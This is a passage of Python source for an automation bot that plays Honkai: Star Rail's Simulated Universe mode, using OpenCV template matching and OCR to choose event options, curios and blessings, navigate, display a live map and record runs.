        name = name.strip(" 　，,。.、·:：；;！!？?「」『』[]()（）")
        return name if len(name) > 1 else ""

    def event_name_for_log(self, screen=None):
        """
        事件名只在写日志时才有用，所以这里才去 OCR。
        每次事件最多读一次（读到的存进 self.event 复用），认不出来就用「未知事件」。
        离开选项界面（选项区一个字都读不到）时会把 self.event 清空，下一个事件重新读，
        """
        if not getattr(self, "event", ""):
            name = self.read_event_name(screen)
            if name:
                self.event = name
        return getattr(self, "event", "") or "未知事件"

    def option_icon_names(self):
        """
        第一遍要匹配的选项图标模板名。模拟宇宙的选项图标只有星号（※）。
        个别事件会给某个选项配别的图标，那种内核自己补。
        """
        return ("star",)

    def extra_option_icon_names(self):
        """
        第一遍没命中优选项时，额外补认一遍的图标模板名。
        模拟宇宙本身没有可补的图标，因此返回空元组。
        """
        return ()

    def event_option_icons(self, names=None):
        """
        找出图标列里**所有**选项图标的中心，返回[{"x","y","score","icon"}]（屏幕坐标，按 y 排序，icon 是模板名）
        check() 只能拿到全局最高分的一个位置：一帧里有 3~5 条选项时只有最靠上的那个图标会被认出来。
        图标既是「选项出现了」的标志，也是每条选项横条的锚点，所以这里自己做多目标匹配，
        与 check() 完全同一个搜索窗口，逐个模板取所有 > 0.95 的峰值，12 px 内只留最高的那个。
        names：要匹配的图标模板名，默认就是 option_icon_names() 那一遍；补认的模板由
        extra_option_icon_names() 给出，只有第一遍没命中优选项时才会走到（见 select_event）。
        一个星号都没有说明这一帧不是选项界面，补认的模板那时也不匹配。
        """
        names = self.option_icon_names() if names is None else tuple(names)
        mask_img = find_image_by_name("mask_event_icon")
        if mask_img is None:
            self._option_icons = []
            return []
        shape = (int(self.scx * mask_img.shape[0]), int(self.scx * mask_img.shape[1]))
        anchor_x, anchor_y = 0.2865, 0.5000
        local = self.get_local(anchor_x, anchor_y, shape)
        left = max(0, self.xx - int(anchor_x * self.xx) - (shape[1] + 60) // 2)
        top = max(0, self.yy - int(anchor_y * self.yy) - (shape[0] + 60) // 2)
        icons = []
        for name in names:
            if name != "star" and "star" in names and not icons:
                # 一个星号都没认到：这一帧不是选项界面，补认的模板不再匹配。
                break
            target = find_image_by_name(name)
            if target is None:
                continue
            target = cv.resize(
                target,
                dsize=(int(self.scx * target.shape[1]), int(self.scx * target.shape[0])),
            )
            result = cv.matchTemplate(local, target, cv.TM_CCORR_NORMED)
            ys, xs = np.where(result > 0.95)
            for score, px, py in sorted(
                (
                    (float(result[py, px]), int(px), int(py))
                    for py, px in zip(ys.tolist(), xs.tolist())
                ),
                reverse=True,
            ):
                center_x = left + px + target.shape[1] / 2
                center_y = top + py + target.shape[0] / 2
                if any(
                    abs(center_x - icon["x"]) <= 12 and abs(center_y - icon["y"]) <= 12
                    for icon in icons
                ):
                    continue
                icons.append({"x": center_x, "y": center_y, "score": score, "icon": name})
        icons.sort(key=lambda icon: icon["y"])
        # 记下这一帧认到的图标：select_event 用「一个图标都没有」判断这一帧是不是什么都没识别到，
        # 免得为了写那条 warning 再匹配一次。
        self._option_icons = icons
        return icons

    def event_option_rows(self, fresh=False, names=None):
        """
        按每条选项左侧的图标（模拟宇宙里就是星号 ※）只 OCR 它右侧的横条，返回识别到的选项行。
        每行 = {"raw_text": 选项文字, "box": 选项文字行的屏幕框,
        "lines": 这一条读到的全部文字行, "icon": 图标位置}。
        选项文字一定在图标右侧，所以只认与图标同一行的选项文字。
        左边包含 ※ 在内：正屏 OCR 会把 ※ 和选项文字并进同一个文本框，
        横条左缘必须容得下它，否则 box_contain 过滤不出来。
        names：交给 event_option_icons 的图标模板名，默认 option_icon_names() 那一遍。
        """
        kx, ky = self.xx / 1920, self.yy / 1080
        panel_right = int(1850 * kx)
        rows = []
        for icon in self.event_option_icons(names):
            band = [
                int(icon["x"] - 30 * kx),
                panel_right,
                int(icon["y"] - 30 * ky),
                int(icon["y"] + 20 * ky),
            ]
            lines = [
                res
                for res in self.ts.find_with_box(box=band, forward=fresh, re_screen=fresh)
                if isinstance(res, dict)
                and len(res.get("raw_text", "").strip()) > 1
                and "UID" not in res.get("raw_text", "")
                and "确定" not in res.get("raw_text", "")
            ]
            if not lines:
                continue
            lines.sort(key=lambda res: res["box"][2])
            row = dict(lines[0])  # 第一行才是选项文字，下面是说明文字
            row["lines"] = lines
            row["icon"] = icon
            rows.append(row)
        rows.sort(key=lambda row: row["box"][2])
        return rows

    # 事件界面：由左上角「事件」文字触发，一次调用把事件界面这一帧该做的事按优先级走完：
    #   金色 ▼（对话阶段）→ 推进图标（arrow → arrow_1 → shop_herta）→ 界面标题让路（奇物商店等）
    #   → 选项图标（选项出现的标志）→ 选项识别选择 + warning/兜底选项 + 点击「确定」
    # 选项图标都在左侧图标列，用 mask_event_icon（窗口 180x960）。
    # 选项区什么都读不到时就什么都不点，并补一条 warning 说明这一帧整个函数什么都没识别到。
    # 选项图标（星号 ※）出现就代表选项出现了，它和选项文字绑定：
    # event_option_rows 先把所有选项图标都认出来，再只 OCR 每个图标右侧的文字。
    def select_event(self):
        screen = self.get_screen()
        if self.check("arrow_dialog", 0.1781, 0.3250, mask="mask_dialog"):
            key_mouse_manager.click(self.tx, self.ty)
            return
        for photo in ("arrow", "arrow_1", "shop_herta"):
            if self.check(photo, 0.2865, 0.5000, mask="mask_event_icon"):
                key_mouse_manager.click(self.tx, self.ty)
                return
        # 若检测到切换到奇物商店或祝福强化界面：交给对应动作处理
        label = self.event_ui_label(screen)
        if any(skip in label for skip in ("商店", "奇物", "祝福", "强化")):
            if getattr(self, "_skip_label_logged", None) != label:
                self._skip_label_logged = label
                CUS_LOGGER.debug(f"当前界面是「{label}」，交给它的动作处理")
            return
        self._skip_label_logged = None
        # 选项图标（星号 ※）出现代表选项出现
        rows = self.event_option_rows(names=self.option_icon_names())
        if not rows:
            # 选项区一个字都没有：选完选项正在进战斗、或玩家已经离开事件界面时
            CUS_LOGGER.debug(
                f"事件「{getattr(self, 'event', '') or '未知事件'}」选项列表区域没有识别到任何文本或已退出事件，本帧不点击"
            )
            if not getattr(self, "_option_icons", None) and getattr(self, "_nothing_logged", None) is not True:
                # 金色▼、推进图标、标题、选项图标、选项文字全没认到
                self._nothing_logged = True
                CUS_LOGGER.info("「救世主」…在命运三相神谕的语境下，这张牌意味着谐调和完美无缺。")
            # 已经离开选项界面：忘掉上一个事件的名字，下一个事件写日志时重新读
            self.event = ""
            self._option_shown_at = None
            return
        self._nothing_logged = None
        if getattr(self, "_option_shown_at", None) is None:
            # 面板上第一次认到选项：记下时刻，用来等它淡入完（见下面的兜底决定）
            self._option_shown_at = time.time()
        # 事件名只在写日志时才需要，交给 event_name_for_log 读
        prior = self.click_event_prior("", rows)
        if not prior:
            # 第一遍只认主要图标，没命中优选项时再用 extra_option_icon_names() 补认一遍。
            extra_names = self.extra_option_icon_names()
            if extra_names:
                all_rows = self.event_option_rows(names=self.option_icon_names() + tuple(extra_names))
                if len(all_rows) > len(rows):
                    rows = all_rows
                    prior = self.click_event_prior("", rows)
        if not prior:
            # 事件名先读出来：下面不管是「先等面板淡入」还是兜底，日志里都要写事件名。
            # 读到的名字会缓存进 self.event，本帧只读这一次，后面的帧直接用缓存。
            event_name = self.event_name_for_log(screen)
            if self._option_shown_at is not None and time.time() - self._option_shown_at < 0.8:
                # 选项面板是淡入的：先出选项文字、后出选项图标，在这不到 0.8 s 的窗口里按兜底点会点错。
                # 所以本帧先不决定，也不 sleep：直接返回，下一帧重新截图重新认，
                # 那时图标已经正常显示，优选项自然就命中了。等满 0.8 s 还没命中才照旧走兜底。
                CUS_LOGGER.debug(f"事件「{event_name}」选项面板刚出现（图标可能还在淡入），本帧不点击")
                return
            # 没有战斗的事件不存在优选项
            CUS_LOGGER.debug(f"事件「{event_name}」没有匹配到优选项，将改选识别范围内的选项")
            picked = self.pick_fallback_option(rows)
            if picked is None or not self.click_event_option(event_name, picked):
                # 认到了选项图标与选项文字，但兜底选项的点击点落在选项面板外
                CUS_LOGGER.warning(f"事件「{event_name}」的兜底选项点击点不在选项面板内，本帧不点击")
                return
            self.confirm_event(event_name, self.confirm_point(picked))
            return

        if self.confirm_event(point=self.confirm_point(prior)):
            return
        if self.click_text(text="休息区", box=[187, 289, 903, 941], click=False, warning=False):
            CUS_LOGGER.info("事已至此，我只想知道，当他们以凡人的身躯在黑潮中消散时……你为何连一滴眼泪都没有流下？")
            key_mouse_manager.click(0.1667, 0.2592)

    # 选取奇物
    def select_strange(self):
        img = self.get_small_interaction_img(x=0.5000, y=0.7333, mask="mask_strange", fresh=True)
        res = self.ts.split_and_find(self.tk.strange, img, mode="strange")
        key_mouse_manager.click(*self.calc_point((0.5000, 0.7333), res[0]))
        key_mouse_manager.click(0.1365, 0.1093)
        self.wait_flag(lambda: self.click_text(text="选择奇物",box=[5, 219, 3, 111],click=False,ocr_line=False,warning=False), 1.4)
    # 丢弃奇物
    def drop_strange(self):
        key_mouse_manager.click(0.4714, 0.5500)
        key_mouse_manager.click(0.1339, 0.1028)
        self.wait_flag(lambda: self.click_text(text="丢弃奇物",box=[10, 220, 0, 112],click=False,ocr_line=False,warning=False), 1.4)
    def drop_bless(self):
        st = set(self.tk.fates) - set(self.tk.secondary)
        clicked = 0
        for i, ft in enumerate(self.tk.secondary[::-1]):
            if ft != self.fate or i == len(self.tk.secondary):
                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
                if self.debug == 2:
                    CUS_LOGGER.debug(f"St: {list(st)}, Secondary: {self.tk.secondary}")
                res_down = self.ts.split_and_find(list(st), img_down, mode="bless")
                if res_down[1] == 2:
                    key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
                    clicked = 1
                    break
                st.add(ft)
        if not clicked:
            key_mouse_manager.click(0.4714, 0.5500)
        key_mouse_manager.click(0.1203, 0.1093)
    def setting(self):
        key_mouse_manager.click(0.2708, 0.2324)
    def enhance(self):
        self.quit = time.time()
        for i in [None, (0.7984, 0.6824), (0.6859, 0.6824)]:
            if self.check("enhance_fail", 0.1068, 0.0907, fresh=True):
                break
            if i is not None:
                key_mouse_manager.click(i[0], i[1])
            key_mouse_manager.click(0.1089, 0.0926)
            tm = time.time()
            while not self.click_text(text="祝福强化",box=[70, 236, 9, 125],click=False,ocr_line=False,warning=False) and time.time() - tm < 7:
                key_mouse_manager.click(0.2062, 0.2054)
        key_mouse_manager.press("esc")
        if self.floor >= 13:
            self.update_floor(12)
    def confirm_yes(self):
        if self.click_text(text="确认",click=False,delay=1,after_delay=1):
            key_mouse_manager.click(self.tx, self.ty)
            key_mouse_manager.wait()
        return 0

    def update_count(self, read=True):
        """
        更新或读取计数器值

        该函数用于管理模拟宇宙的运行计数，可以读取保存在文件中的计数器值，
        或将当前计数器值加1后保存到文件中。

        参数:
            read: bool，控制操作模式
                  True表示读取模式，从文件中读取计数器值
                  False表示写入模式，将当前计数器值加1后保存到文件中

        返回值:
            无返回值，直接更新实例变量self.count
        """
        file_name = os.path.join(PATHS["backup"], "count.txt")
        if read:
            new_cnt = 0
            if os.path.exists(file_name):
                with open(file_name, encoding="utf-8", errors="ignore") as fh:
                    s = fh.readlines()
                    try:
                        new_cnt = int(s[0].strip("\n"))
                    except Exception:
                        pass
            else:
                os.makedirs(PATHS["backup"], exist_ok=True)
                with open(file_name, "w", encoding="utf-8") as file:
                    file.write("0")
                    file.close()
        else:
            new_cnt = self.count + 1
            try:
                with open(file_name, "w", encoding="utf-8") as file:
                    file.write(str(new_cnt))
                    file.close()
            except  Exception as e:
                CUS_LOGGER.error(f"写入文件失败{e}")
        self.count = new_cnt

    def del_pt(self, img, A, S, f):
        """
        递归删除图像中的连接点

        该函数通过递归方式删除图像中与起始点相连的像素点，用于清理图像中的特定区域。
        删除条件包括超出边界、像素值为黑色、不满足特定函数条件且距离起始点较远等情况。

        参数:
            img: 图像数组，要处理的图像数据
            A: tuple，当前处理的像素点坐标 (row, col)
            S: tuple，起始点坐标 (row, col)
            f: function，判断像素点是否符合条件的函数

        返回值:
            无返回值
        """
        if (
            A[0] < 0
            or A[1] < 0
            or A[0] >= img.shape[0]
            or A[1] >= img.shape[1]
            or (img[A] == [0, 0, 0]).all()
            or (not f(img[A]) and get_dis(A, S) > 5)
            or get_dis(A, S) > 10
        ):
            return
        else:
            img[A] = [0, 0, 0]
        for dx, dy in [(0, -1), (0, 1), (1, 0), (-1, 0)]:
            self.del_pt(img, (A[0] + dx, A[1] + dy), S, f)

    def get_target(self, pth, x, y, target_mode="battle"):
        """根据地图获取目标路径点位及类型。"""
        img = cv.imread(pth)
        res = set()
        f_set = [
            lambda p: p[2] < 85 and p[1] < 85 and p[0] > 180,  # path, blue
            lambda p: p[2] > 180 and p[1] < 70 and p[0] < 70,  # enemy, red
        ]
        if target_mode == "battle":
            f_set += [
                lambda p: p[2] < 90 and p[1] > 220 and p[0] < 90,  # interaction, green
                lambda p: p[2] > 180 and p[1] > 180 and p[0] < 70,  # end, yellow
            ]
        elif target_mode == "special":
            f_set += [
                # JPEG compression shifts the annotated yellow-green
                # (roughly RGB 181, 230, 29), hence the deliberately bounded
                # red channel. Pure green is the generated start marker and
                # pure yellow remains the end marker.
                lambda p: 120 < p[2] < 230 and p[1] > 180 and p[0] < 90,
                lambda p: p[2] >= 230 and p[1] > 180 and p[0] < 70,
            ]
        else:
            raise ValueError(f"unknown target map mode: {target_mode}")
        for i in range(img.shape[0]):
            for j in range(img.shape[1]):
                for k in range(4):
                    if f_set[k](img[i, j]):
                        p = get_center(img, i, j)
                        #记录坐标，类型，坐标取整
                        # CUS_LOGGER.debug(f"原始位置{(i,j)}，加权位置{p},类型{k}")
                        nep=tuple(re_get_position((p[1]+x,p[0]+y),re=True))
                        # CUS_LOGGER.debug(f"映射坐标{nep}")
                        res.add((nep, k))
                        p = (int(p[0]), int(p[1]))
                        #引用传递，会影响img源图像
                        self.del_pt(img, p, p, f_set[k])
                        if k == 3:
                            #记录终点
                            self.last = p

        # 聚类合并相近点
        if len(res) > 1:
            # 按类型分组
            groups = {}
            for p in res:
                groups.setdefault(p[1], []).append(p)

            # 对每组进行距离聚类
            merged = []
            for pts in groups.values():
                if len(pts) <= 1:
                    merged.extend(pts)
                    continue

                # 聚类逻辑
                used, clusters = set(), []
                for i, p1 in enumerate(pts):
                    if i in used:
                        continue
                    cluster = [p1]
                    used.add(i)
                    for j, p2 in enumerate(pts[i+1:], i+1):
                        if j not in used and get_dis(p1[0], p2[0]) < 5:
                            cluster.append(p2)
                            used.add(j)
                    clusters.append(cluster)

                # 选择代表点
                for c in clusters:
                    rep = min(c, key=lambda x: get_dis(x[0], self.last)) if hasattr(self, 'last') else c[0]
                    merged.append(rep)
            CUS_LOGGER.debug(f"聚类合并: {len(res)}-> {len(merged)}")
            res = set(merged)
        if self.speed:
            dis = 1000000
            pt = None
            #找到终点
            for i in res:
                if i[1] == 1 and get_dis(i[0], self.last) < dis:
                    dis = get_dis(i[0], self.last)
                    pt = i
            #将除了终点外的所有路径点改为类型0
            for i in deepcopy(res):
                if i[1] == 1 and pt != i:
                    res.remove(i)
                    res.add((i[0], 0))
        return res



    def restore_map(self):
        """
        从磁盘文件恢复地图数据

        从磁盘文件中读取并恢复之前备份的地图数据和相关属性，包括：
        1. 从PNG图像文件恢复地图图像数据(big_map)
        2. 从JSON文件恢复其他地图相关属性

        备份文件从项目目录下的user/backup文件夹中读取。
        """
        try:
            # 从磁盘读取 big_map 图像文件
            backup_file = os.path.join(PATHS["backup"], "big_map_backup.png")
            if os.path.exists(backup_file):
                self.big_map = cv.imread(backup_file, cv.IMREAD_GRAYSCALE)

            # 从磁盘读取其他属性
            attrs_file = os.path.join(PATHS["backup"], "map_attrs_backup.json")
            if os.path.exists(attrs_file):
                with open(attrs_file) as f:
                    backup_data = json.load(f)

                self.big_map_init = backup_data.get('big_map_init', self.big_map_init)
                self.now_loc = tuple(backup_data.get('now_loc', self.now_loc))
                self.mini_state = backup_data.get('mini_state', self.mini_state)
                self.first_mini = backup_data.get('first_mini', self.first_mini)
        except Exception:
            pass




    def goto_herta_office(self):
        """
        前往黑塔办公室

        该函数负责自动导航到黑塔办公室，主要流程包括：
        1. 检查是否已经在办公室内
        2. 如果不在办公室，则通过地图导航到黑塔办公室
        3. 进行传送操作并移动到最终目的地

        函数会利用一系列图像识别和文本识别来确定当前位置，
        并执行相应的点击、拖拽和键盘操作来完成导航。
        """
        if self.state=="init2":
            return
        self.update_state("init")
        if self.click_text(text="模拟宇宙",box=[1231, 1360, 595, 631],click=False,allow_fail= True):
            CUS_LOGGER.info("已在办公室，打开模拟宇宙")
            key_mouse_manager.press('f')
            return
        CUS_LOGGER.info("前往黑塔办公室")
        CUS_LOGGER.info("打开地图")
        key_mouse_manager.press('m')
    def goto_survival_room(self):
        key_mouse_manager.mouse_move(15)
        key_mouse_manager.keyDown("w")
        sprint()
        key_mouse_manager.sleep(4)
        key_mouse_manager.keyUp("w")
        key_mouse_manager.wait()
        self.update_state("survival_room")

    def show_map(self):
        """
        实时显示模拟宇宙地图的可视化窗口

        该方法在一个独立线程中运行，创建一个OpenCV窗口用于显示当前游戏地图，
        并实时更新玩家位置、目标位置和朝向等信息。主要包括以下功能：
        1. 创建可缩放且不自动聚焦的OpenCV窗口
        2. 监控角色位置、目标位置和朝向等状态变化，仅在有更新时重绘地图
        3. 在地图上绘制当前位置（绿色）、目标位置（根据类型着色）及朝向箭头
        4. 显示当前角度和目标坐标，并通过颜色变化提示角度更新时间
        5. 放大地图图像并维持合理刷新率，按'q'键退出

        注意：该方法应在单独的线程中调用，不应直接调用
        """
        try:
            # 创建窗口时使用 WINDOW_FREERATIO 标志以避免自动获取焦点
            cv.namedWindow("Map", cv.WINDOW_FREERATIO | cv.WINDOW_NORMAL)
            # 设置窗口初始大小
            win_width, win_height = 600, 600
            cv.resizeWindow("Map", win_width, win_height)
            cv.startWindowThread()
            set_forground()
            # 缓存上一次的状态，避免不必要的重绘
            last_real_loc = None
            last_target_loc = None
            last_target_type = None
            last_ang = None

            while not self._stop:
                if self.debug_map is not None:
                    pass
                elif self.big_map is None or self.now_loc is None or self.target_loc is None :
                    # 使用cv.pollKey()替代cv.waitKey()以避免阻塞
                    key = cv.pollKey()
                    if key == ord('q'):
                        break
                    time.sleep(0.1)  # 短暂休眠避免CPU占用过高
                    continue

                # 检查是否有变化，如果没有变化则跳过更新
                current_now_loc = self.now_loc
                current_target_loc = self.target_loc
                current_target_type = self.target_type
                current_ang = self.ang

                # 如果没有重要变化，则短暂等待后继续
                if (last_real_loc == current_now_loc and
                    last_target_loc == current_target_loc and
                    last_target_type == current_target_type and
                    last_ang == current_ang):
                    # 使用cv.pollKey()替代cv.waitKey()以避免阻塞
                    key = cv.pollKey()
                    if key == ord('q'):
                        break
                    time.sleep(0.1)  # 短暂休眠避免CPU占用过高
                    continue

                # 更新缓存值
                last_real_loc = current_now_loc
                last_target_loc = current_target_loc
                last_target_type = current_target_type
                last_ang = current_ang
                # 只在需要时才拷贝图像
                if self.debug_map is not None:
                    updated_image = self.debug_map.copy()
                else:
                    updated_image = self.pos_predictor.draw_position_on_map(show=False)
                    current_target_loc = re_get_position(current_target_loc)
                    current_now_loc = re_get_position(current_now_loc)
                # 初始化坐标偏移量
                x_offset = 0
                y_offset = 0
                # 检查是否存在tmp地图，如果有则与原始地图拼接
                if self.pos_map is not None:
                    tmp_colored = self.pos_map.copy()
                    # 调整图像尺寸以匹配垂直拼接的宽度
                    max_width = max(updated_image.shape[1], tmp_colored.shape[1])
                    # 调整两个图像的宽度以匹配最大宽度
                    if updated_image.shape[1] < max_width:
                        # 为updated_image添加右侧填充
                        width_diff = max_width - updated_image.shape[1]
                        left_pad = width_diff // 2
                        right_pad = width_diff - left_pad
                        updated_image = np.pad(updated_image, ((0, 0), (left_pad, right_pad), (0, 0)), mode='constant', constant_values=0)
                        x_offset = left_pad  # 更新x方向偏移量

                    elif tmp_colored.shape[1] < max_width:
                        # 对updated_image进行resize以匹配tmp_colored的宽度
                        scale_factor = tmp_colored.shape[1] / updated_image.shape[1]
                        new_height = int(updated_image.shape[0] * scale_factor)
                        updated_image = cv.resize(updated_image, (tmp_colored.shape[1], new_height), interpolation=cv.INTER_AREA)
                        max_width = tmp_colored.shape[1]  # 更新max_width为tmp_colored的宽度
                    top_spacing = 10
                    top_spacing_img = np.zeros((top_spacing, max_width, 3), dtype=np.uint8)
                    y_offset = top_spacing
                    middle_spacing = 10
                    middle_spacing_img = np.zeros((middle_spacing, max_width, 3), dtype=np.uint8)
                    # 垂直拼接：上方间距 + 小地图 + 中间间距 + 大地图
                    updated_image = np.vstack((top_spacing_img, tmp_colored, middle_spacing_img,updated_image ))
                else:
                    top_spacing = 10
                    top_spacing_img = np.zeros((top_spacing, updated_image.shape[1], 3), dtype=np.uint8)
                    down_spacing = max(0,3*updated_image.shape[1]-updated_image.shape[0])
                    if self.debug_map is None:
                        down_spacing_img = np.zeros((down_spacing, updated_image.shape[1], 3), dtype=np.uint8)
                        updated_image = np.vstack((top_spacing_img,updated_image,down_spacing_img))

                # 确保坐标值为整数类型，避免切片索引错误
                real_x, real_y = current_now_loc
                real_x = int(real_x + x_offset -self.upx)
                real_y = int(real_y + y_offset-self.upy)
                # 绘制当前位置（绿色）
                for dx in range(-2, 3):
                    for dy in range(-2, 3):
                        if (0 <= real_y + dy < updated_image.shape[0] and
                            0 <= real_x + dx < updated_image.shape[1]):
                            updated_image[real_y + dy, real_x + dx] = [49, 140, 49]
                if current_target_loc is not None:
                    target_x, target_y = current_target_loc
                    target_x = int(target_x + x_offset - self.upx)
                    target_y = int(target_y + y_offset - self.upy)
                # 调整坐标以适应图像拼接后的偏移
                    # 绘制目标位置
                    color_map = {
                        0: [140, 49, 49],  # 蓝色
                        1: [49, 49, 140],   # 红色
                        2: [29, 230, 181],  # 黄绿色交互点，与绿色当前位置区分
                        3: [49, 140, 140]   # 黄色
                    }
                    target_color = color_map.get(current_target_type, [49, 140, 140])


                    for dx in range(-2, 3):
                        for dy in range(-2, 3):
                            if (0 <= target_y + dy < updated_image.shape[0] and
                                0 <= target_x + dx < updated_image.shape[1]):
                                updated_image[target_y + dy, target_x + dx] = target_color
                    # 在左上角显示目标坐标
                    target_text = f"target: ({target_x - x_offset - self.upx}, {target_y - y_offset - self.upy})"
                    cv.putText(updated_image, target_text, (x_offset, 20),
                               cv.FONT_HERSHEY_SIMPLEX, 0.25, (0, 255, 255), 1)

                # 绘制朝向箭头
                if current_ang is not None:
                    import math
                    angle_rad = math.radians(-current_ang)
                    line_length = 20
                    end_point = (
                        int(real_x + line_length * math.cos(angle_rad)),
                        int(real_y - line_length * math.sin(angle_rad))
                    )

                    # 确保线条端点在图像范围内
                    if (0 <= real_y < updated_image.shape[0] and
                        0 <= real_x < updated_image.shape[1] and
                        0 <= end_point[1] < updated_image.shape[0] and
                        0 <= end_point[0] < updated_image.shape[1]):
                        cv.arrowedLine(
                            updated_image,
                            (real_x, real_y),  # 注意：cv.arrowedLine使用(x,y)坐标
                            end_point,
                            (0, 255, 0),
                            1,
                            tipLength=0.4
                        )

                cv.imshow("Map", updated_image)
                # 使用cv.pollKey()替代cv.waitKey()以避免阻塞
                key = cv.pollKey()
                if key == ord('q'):
                    break
                # 检查停止标志
                if self._stop:
                    break
        except Exception as e:
            raise e
        finally:
            # 无论如何都要确保窗口被关闭
            try:
                cv.destroyAllWindows()
                cv.waitKey(1)
            except Exception as e:
                CUS_LOGGER.error(f'异常关闭窗口{e}')
    def start(self):
        """
        启动模拟宇宙自动化程序

        该方法负责初始化并启动整个模拟宇宙运行流程，包括：
        1. 初始化运行状态
        2. 启动键盘鼠标管理器
        3. 启动地图显示线程（如果启用）
        4. 开始执行主要路线逻辑

        如果在执行过程中发生异常，会尝试停止运行并重新抛出异常。
        """
        self._stop = False
        key_mouse_manager.start()
        if self.record and self.gwypzmgzcndqlp:
            self.recorder.start_recording(self.count + 1)
        if self._show_map:
            self.map_thread = ThreadWithException(target=self.show_map,name="地图")
            self.map_thread.start()
        try:
            self.route()
        except NormalEndError as e:
            CUS_LOGGER.warning(f'离开游戏界面，正常终止进程{e}')
            raise
        except Exception as e:
            CUS_LOGGER.error(f'异常终止进程{e}')
            if not self._stop:
                self.stop()
            # 重新抛出异常，以便上层能够捕获
            raise

    def stop(self, *_, **__):
        """
        停止模拟宇宙运行

        该方法负责安全地停止所有运行中的线程和操作，包括：
        1. 设置停止标志
        2. 停止键盘鼠标管理器
        3. 等待并终止地图显示线程

        参数:
            *_: 忽略的位置参数
            **__: 忽略的关键字参数
        """
        CUS_LOGGER.info("翁法罗斯已经等待了这一刻太久……还可以等待更久……只要祂还曾燃烧……")
        self._stop = 1
        key_mouse_manager.stop()
        if self.record and self.bveerelbcpgyqan :
            CUS_LOGGER.info("以「爱」的名义，她将逝去的一切尽数珍藏……直到世间的尽头……")
            try:
                if hasattr(self, "kill_count"):
                    self.recorder.stop_recording(delete_video=self.kill_count == 0)
                else:
                    self.recorder.stop_recording()
            except Exception as e:
                CUS_LOGGER.error(f"停止录制时发生错误: {e}")
        self.save_screen(not_now=True, save_path=os.path.join(PATHS["temp"], "stop"))
        self.save_screen(save_path=os.path.join(PATHS["temp"], "stop"))
        self.map_thread = None




def create_engine(*, script=False):
    config.read()
    return SimulatedUniverse(
        1, int(config.debug_mode), int(config.speed_mode), int(config.use_consumable),
        int(config.slow_mode), -1 if script else int(config.max_run), bonus=config.bonus,
    )
